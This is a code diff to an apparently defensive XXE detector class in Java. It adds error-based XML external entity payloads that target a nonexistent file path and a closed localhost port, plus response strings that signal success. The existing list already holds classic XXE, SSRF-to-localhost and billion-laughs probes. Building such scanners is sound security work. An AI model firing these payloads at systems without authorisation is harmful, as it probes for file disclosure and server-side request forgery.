@@ -21,6 +21,9 @@ public class XxeDetector {
     /** Canary string we embed in entity declarations; its presence in the response indicates XXE. */
     private static final String CANARY = "xxe-anibus-7k3b";
 
+    /** Marker used by error-based payloads — forces parser to mention a non-existent path. */
+    private static final String ERROR_MARKER = "anibus-nope-" + CANARY;
+
     /**
      * XXE payloads — each tries a different technique:
      * classic file read, error-based, SSRF via DTD.
@@ -35,7 +38,12 @@ public class XxeDetector {
         // SSRF to localhost
         "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://127.0.0.1/\">]><root>&xxe;</root>",
         // Billion laughs — send small payload to detect parse but don't actually use it
-        "<?xml version=\"1.0\"?><!DOCTYPE lolz [<!ENTITY lol \"lol\"><!ENTITY lol2 \"&lol;&lol;\">]><root>&lol2;</root>"
+        "<?xml version=\"1.0\"?><!DOCTYPE lolz [<!ENTITY lol \"lol\"><!ENTITY lol2 \"&lol;&lol;\">]><root>&lol2;</root>",
+        // Error-based via undefined system path — server echoes parser error containing our marker,
+        // confirming the DTD was actually parsed (works even when out-of-band is blocked).
+        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///" + ERROR_MARKER + "\">]><root>&xxe;</root>",
+        // Error-based via SSRF to closed local port — expect "Connection refused" in parser output
+        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://127.0.0.1:1/" + ERROR_MARKER + "\">]><root>&xxe;</root>"
     );
 
     /** Strings in the response body that indicate successful XXE exploitation. */
@@ -47,6 +55,10 @@ public class XxeDetector {
         "for 16-bit",     // win.ini
         "127.0.0.1",      // SSRF reflected
         "localhost",
+        "Connection refused", // error-based SSRF probe
+        "failed to open stream", // PHP libxml error
+        "DOCTYPE is disallowed", // sometimes leaks raw parser msg
+        ERROR_MARKER,         // our error-based marker echoed back
         CANARY
     );
 
